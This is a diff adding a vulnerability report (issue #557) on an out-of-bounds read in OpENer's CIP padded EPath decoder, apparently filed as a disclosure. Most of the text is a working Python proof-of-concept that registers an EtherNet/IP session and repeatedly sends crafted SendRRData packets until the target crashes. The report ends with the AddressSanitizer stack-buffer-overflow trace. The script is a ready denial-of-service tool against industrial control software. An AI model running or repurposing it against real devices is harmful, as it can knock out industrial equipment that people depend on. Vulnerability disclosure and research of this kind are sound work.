@@ -1,0 +1,182 @@
+issue #557
+
+Executive Summary
+
+A remotely reachable out-of-bounds read exists in OpENer’s explicit messaging path while decoding CIP padded EPath data. The parser decodes attacker-controlled path segments before validating that the declared
+path length is fully present in the buffer. The decoder does not receive remaining-buffer length and performs unchecked reads (*message_runner, message_runner + 1, and 16-bit reads).
+
+Using crafted SendRRData payloads after session registration, the issue is reproducible and ASan reports a stack-buffer-overflow in DecodePaddedEPath, causing process termination (denial of service).
+
+PoC
+
+#!/usr/bin/env python3
+import socket
+import struct
+import sys
+
+
+HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
+PORT = 44818
+MAX_TRIES = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
+TIMEOUT = 1.0
+
+REGISTER_SESSION = bytes.fromhex(
+    "65000400000000000000000000000000000000000000000001000000"
+)
+
+
+def recv_exact(sock: socket.socket, n: int) -> bytes:
+    data = b""
+    while len(data) < n:
+        chunk = sock.recv(n - len(data))
+        if not chunk:
+            raise ConnectionError("connection closed")
+        data += chunk
+    return data
+
+
+def register_session(sock: socket.socket) -> int:
+    sock.sendall(REGISTER_SESSION)
+    hdr = recv_exact(sock, 24)
+    cmd, length, session, status = struct.unpack("<HHII", hdr[:12])
+    if cmd != 0x0065 or status != 0 or length < 4:
+        raise RuntimeError(f"bad register-session response: {hdr.hex()}")
+    if length:
+        recv_exact(sock, length)
+    return session
+
+
+def build_send_rr_data(session: int, cip_payload: bytes) -> bytes:
+    interface_handle = struct.pack("<I", 0)
+    timeout = struct.pack("<H", 0)
+    item_count = struct.pack("<H", 2)
+    null_address = struct.pack("<HH", 0x0000, 0)
+    unconnected_data = struct.pack("<HH", 0x00B2, len(cip_payload)) + cip_payload
+    payload = interface_handle + timeout + item_count + null_address + unconnected_data
+    encap = struct.pack("<HHII8sI", 0x006F, len(payload), session, 0, b"\x00" * 8, 0)
+    return encap + payload
+
+
+def make_crash_cip() -> bytes:
+    # 24(encap) + 16(cpf/rr) + 472(cip) = 512 total bytes
+    # service(1) + path_size(1) + 235 * (8-bit logical segment 2 bytes) = 472
+    cip = b"\x0e" + bytes([236]) + (b"\x20\x01" * 235)
+    assert len(cip) == 472
+    return cip
+
+
+CRASH_CIP = make_crash_cip()
+
+
+def fire_once() -> None:
+    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as s:
+        s.settimeout(TIMEOUT)
+        sess = register_session(s)
+        pkt = build_send_rr_data(sess, CRASH_CIP)
+        s.sendall(pkt)
+        try:
+            s.recv(64)
+        except Exception:
+            pass
+
+
+def server_alive_probe() -> bool:
+    try:
+        with socket.create_connection((HOST, PORT), timeout=0.3) as s:
+            s.settimeout(0.3)
+            register_session(s)
+        return True
+    except Exception:
+        return False
+
+
+def main() -> int:
+    for i in range(1, MAX_TRIES + 1):
+        try:
+            fire_once()
+        except Exception:
+            pass
+
+        if not server_alive_probe():
+            print(f"[+] target appears DOWN at try={i}")
+            return 0
+
+        if i % 50 == 0:
+            print(f"[*] sent {i} tries, target still up")
+
+    print("[-] max tries reached, target still up")
+    return 1
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+
+
+ASan
+
+ ASAN_OPTIONS="halt_on_error=1:abort_on_error=1:detect_leaks=0" \
+  UBSAN_OPTIONS="halt_on_error=1:print_stacktrace=1" \
+  ./bin/posix-asan/src/ports/POSIX/OpENer lo
+=================================================================
+==3963310==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe36b52ad0 at pc 0x5b54593f0c7a bp 0x7ffe36b51f20 sp 0x7ffe36b51f10
+READ of size 1 at 0x7ffe36b52ad0 thread T0
+    #0 0x5b54593f0c79 in DecodePaddedEPath /home/swift/work/vulnerability_discovery/OpENer/source/src/cip/cipcommon.c:1403
+    #1 0x5b545940b198 in CreateMessageRouterRequestStructure /home/swift/work/vulnerability_discovery/OpENer/source/src/cip/cipmessagerouter.c:254
+    #2 0x5b545940b198 in NotifyMessageRouter /home/swift/work/vulnerability_discovery/OpENer/source/src/cip/cipmessagerouter.c:188
+    #3 0x5b545941adc8 in NotifyCommonPacketFormat /home/swift/work/vulnerability_discovery/OpENer/source/src/enet_encap/cpf.c:60
+    #4 0x5b5459420c79 in HandleReceivedExplictTcpData /home/swift/work/vulnerability_discovery/OpENer/source/src/enet_encap/encap.c:186
+    #5 0x5b54593dee03 in HandleDataOnTcpSocket /home/swift/work/vulnerability_discovery/OpENer/source/src/ports/generic_networkhandler.c:864
+    #6 0x5b54593e03a0 in NetworkHandlerProcessCyclic /home/swift/work/vulnerability_discovery/OpENer/source/src/ports/generic_networkhandler.c:497
+    #7 0x5b54593dbc44 in executeEventLoop /home/swift/work/vulnerability_discovery/OpENer/source/src/ports/POSIX/main.c:261
+    #8 0x5b54593dbc44 in main /home/swift/work/vulnerability_discovery/OpENer/source/src/ports/POSIX/main.c:229
+    #9 0x724ca7229d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #10 0x724ca7229e3f in __libc_start_main_impl ../csu/libc-start.c:392
+    #11 0x5b54593dc5a4 in _start (/home/swift/work/vulnerability_discovery/OpENer/bin/posix-asan/src/ports/POSIX/OpENer+0x705a4)
+
+Address 0x7ffe36b52ad0 is located in stack of thread T0 at offset 1312 in frame
+    #0 0x5b54593dea1f in HandleDataOnTcpSocket /home/swift/work/vulnerability_discovery/OpENer/source/src/ports/generic_networkhandler.c:720
+
+  This frame has 6 object(s):
+    [48, 52) 'remaining_bytes' (line 722)
+    [64, 68) 'fromlen' (line 852)
+    [80, 88) 'read_buffer' (line 760)
+    [112, 128) 'sender_address' (line 850)
+    [144, 672) 'outgoing_message' (line 862)
+    [800, 1312) 'incoming_message' (line 732) <== Memory access at offset 1312 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow /home/swift/work/vulnerability_discovery/OpENer/source/src/cip/cipcommon.c:1403 in DecodePaddedEPath
+Shadow bytes around the buggy address:
+  0x100046d62500: 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2
+  0x100046d62510: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00
+  0x100046d62520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100046d62530: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100046d62540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x100046d62550: 00 00 00 00 00 00 00 00 00 00[f3]f3 f3 f3 f3 f3
+  0x100046d62560: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100046d62570: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
+  0x100046d62580: 06 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100046d62590: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100046d625a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==3963310==ABORTING
+[1]    3963310 IOT instruction (core dumped)  ASAN_OPTIONS="halt_on_error=1:abort_on_error=1:detect_leaks=0" UBSAN_OPTIONS=
